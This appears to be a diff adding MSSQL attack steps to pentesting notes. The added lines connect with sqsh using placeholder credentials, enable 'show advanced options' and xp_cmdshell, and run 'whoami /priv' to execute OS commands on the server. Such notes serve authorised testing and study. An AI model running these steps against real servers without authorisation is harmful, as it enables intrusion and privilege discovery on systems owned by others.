@@ -166,3 +166,20 @@ we need the same command in sql to enable command execution
 ```shell
 sudo sqsh -U <username> -P <password> -S <TARGET-IP-OR-HOSTNAME>
 ```
+
+```SQL
+sp_configure 'show advanced options',1
+RECONFIGURE
+go
+```
+
+```SQL
+sp_configure 'xp_cmdshell',1
+reconfigure
+go
+```
+
+```sql
+xp_cmdshell 'whoami /priv'
+go
+```
